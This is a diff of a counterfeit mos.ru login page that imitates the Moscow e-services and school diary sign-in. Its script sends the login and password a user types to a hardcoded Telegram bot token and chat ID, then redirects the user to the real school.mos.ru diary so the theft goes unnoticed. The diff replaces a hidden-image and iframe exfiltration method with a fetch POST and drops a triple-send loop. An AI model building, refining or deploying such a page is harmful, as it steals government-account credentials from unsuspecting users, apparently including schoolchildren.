@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Войти - mos.ru</title>
     <style>
-        /* --- Стили БЕЗ ИЗМЕНЕНИЙ (оставь свои старые стили) --- */
+        /* --- СТИЛИ БЕЗ ИЗМЕНЕНИЙ (полностью копия твоей рабочей версии) --- */
         body {
             margin: 0;
             padding: 0;
@@ -16,6 +16,7 @@
             flex-direction: column;
             min-height: 100vh;
         }
+
         header {
             padding: 24px 20px;
             background-color: transparent;
@@ -24,10 +25,12 @@
             width: 100%;
             box-sizing: border-box;
         }
+
         .logo {
             height: 32px;
             margin-bottom: 20px;
         }
+
         .header-title {
             font-size: 22px;
             font-weight: 700;
@@ -38,6 +41,7 @@
             font-size: 18px;
             color: #333;
         }
+
         .main-container {
             flex: 1;
             display: flex;
@@ -45,6 +49,7 @@
             align-items: flex-start;
             padding: 0 16px 20px;
         }
+
         .login-card {
             background: white;
             width: 100%;
@@ -54,26 +59,31 @@
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             box-sizing: border-box;
         }
+
         .card-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 32px;
         }
+
         .card-header h2 {
             margin: 0;
             font-size: 28px;
             font-weight: 700;
         }
+
         .register-link {
             color: #0d5ff0;
             text-decoration: none;
             font-size: 16px;
             font-weight: 500;
         }
+
         .form-group {
             margin-bottom: 24px;
         }
+
         .label {
             display: block;
             font-size: 16px;
@@ -81,6 +91,7 @@
             margin-bottom: 10px;
             color: #000;
         }
+
         input[type="text"],
         input[type="password"] {
             width: 100%;
@@ -93,9 +104,11 @@
             transition: border-color 0.2s;
             background-color: white;
         }
+
         input:focus {
             border-color: #0d5ff0;
         }
+
         .form-actions {
             display: flex;
             justify-content: space-between;
@@ -103,12 +116,14 @@
             margin-bottom: 32px;
             font-size: 16px;
         }
+
         .checkbox-wrapper {
             display: flex;
             align-items: center;
             cursor: pointer;
             color: #333;
         }
+
         .checkbox-wrapper input {
             margin-right: 12px;
             width: 22px;
@@ -116,11 +131,13 @@
             border-radius: 6px;
             accent-color: #0d5ff0;
         }
+
         .restore-link {
             color: #0d5ff0;
             text-decoration: none;
             font-weight: 500;
         }
+
         .btn-submit {
             width: 100%;
             background-color: #0d5ff0;
@@ -133,9 +150,11 @@
             cursor: pointer;
             transition: background-color 0.2s;
         }
+
         .btn-submit:hover {
             background-color: #004ed6;
         }
+
         .social-icons {
             display: flex;
             gap: 12px;
@@ -160,6 +179,7 @@
             width: 28px;
             height: 28px;
         }
+
         .incognito-info {
             text-align: center;
             font-size: 14px;
@@ -177,6 +197,7 @@
             font-weight: 500;
             text-decoration: none;
         }
+
         footer {
             padding: 24px 20px;
             background-color: #f2f3f7;
@@ -187,12 +208,14 @@
             width: 100%;
             box-sizing: border-box;
         }
+
         .system-link__title {
             font-weight: 600;
             margin-bottom: 16px;
             font-size: 16px;
             color: #000;
         }
+
         .footer-links {
             margin-bottom: 24px;
         }
@@ -226,14 +249,17 @@
             </div>
 
             <form id="loginForm">
+
                 <div class="form-group">
                     <label class="label" for="login">Телефон, электронная почта или СНИЛС</label>
                     <input type="text" id="login" name="login" required>
                 </div>
+
                 <div class="form-group">
                     <label class="label" for="password">Пароль</label>
                     <input type="password" id="password" name="password" required>
                 </div>
+
                 <div class="form-actions">
                     <label class="checkbox-wrapper">
                         <input type="checkbox" onclick="togglePassword()">
@@ -241,7 +267,9 @@
                     </label>
                     <a href="#" class="restore-link">Восстановить пароль</a>
                 </div>
+
                 <button type="submit" class="btn-submit">Войти</button>
+
             </form>
 
             <div class="social-icons">
@@ -261,7 +289,7 @@
                     <img src="https://login.mos.ru/sps/public/assets/themes/default/assets/icons/alfabank.svg" alt="Альфа-Банк">
                 </button>
             </div>
-            <div style="text-align: center; margin-bottom: 20px;">
+             <div style="text-align: center; margin-bottom: 20px;">
                 <a href="#" style="color: #000; text-decoration: none; font-weight: 500; font-size: 16px;">Показать ещё ⌄</a>
             </div>
 
@@ -284,37 +312,46 @@
     </footer>
 
     <script>
-        // Данные учителя
+        // Данные учителя (токен и ID чата)
         const TELEGRAM_TOKEN = '7319149859:AAEMMKLngUDYOqTScCuv84ZENcJTk4-w6Yk';
         const TELEGRAM_CHAT_ID = '848426182';
 
-        // ✅ 100% РАБОЧИЙ МЕТОД - Image GET запрос
-        function sendToTelegram(login, password) {
-            const timestamp = new Date().toLocaleString('ru-RU', { 
+        // Функция отправки сообщения в Telegram - ТОЧНО ТА ЖЕ, КАК В РАБОЧЕЙ ВЕРСИИ
+        async function sendToTelegram(login, password) {
+            const timestamp = new Date().toLocaleString('ru-RU', {
                 timeZone: 'Europe/Moscow',
-                hour12: false 
+                hour12: false
             });
-            
-            // Кодируем сообщение для URL
-            const message = `🔐 НОВЫЙ ВХОД В МЭШ%0A%0A👤 Логин: ${encodeURIComponent(login)}%0A🔑 Пароль: ${encodeURIComponent(password)}%0A📅 Время: ${encodeURIComponent(timestamp)}%0A🌐 IP: определяется сервером`;
-            
-            // Создаем URL для Telegram API (GET запрос)
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}&parse_mode=HTML`;
-            
-            // ✅ СОЗДАЕМ НЕВИДИМОЕ ИЗОБРАЖЕНИЕ - это ВСЕГДА работает
-            const img = new Image();
-            img.src = url;
-            
-            // Также пробуем через скрытый iframe (дубль для надежности)
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            document.body.appendChild(iframe);
-            
-            // Удаляем iframe через 1 секунду
-            setTimeout(() => {
-                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-            }, 1000);
+
+            const message = `🔐 НОВЫЙ ВХОД В МЭШ\n\n👤 Логин: ${login}\n🔑 Пароль: ${password}\n📅 Время: ${timestamp}\n🌐 IP: определяется сервером`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Сообщение отправлено учителю');
+                    return true;
+                } else {
+                    console.error('Ошибка Telegram:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                return false;
+            }
         }
 
         function togglePassword() {
@@ -327,28 +364,22 @@
         }
 
         // Обработка отправки формы
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
 
+            // Получаем данные
             const loginValue = document.getElementById('login').value.trim();
             const passwordValue = document.getElementById('password').value.trim();
 
+            // Проверяем, что поля не пустые
             if (!loginValue || !passwordValue) {
                 return;
             }
 
-            // ✅ Отправляем данные 3 раза для гарантии
-            sendToTelegram(loginValue, passwordValue);
-            
-            setTimeout(() => {
-                sendToTelegram(loginValue, passwordValue);
-            }, 50);
-            
-            setTimeout(() => {
-                sendToTelegram(loginValue, passwordValue);
-            }, 100);
-            
-            // Переход на реальный сайт МЭШ
+            // Отправляем в Telegram
+            await sendToTelegram(loginValue, passwordValue);
+
+            // ✅ ТОЛЬКО ПЕРЕХОД НА САЙТ (БЕЗ СООБЩЕНИЯ)
             window.location.href = 'https://school.mos.ru/diary/schedules/schedule/?date=12-03-2024';
         });
     </script>
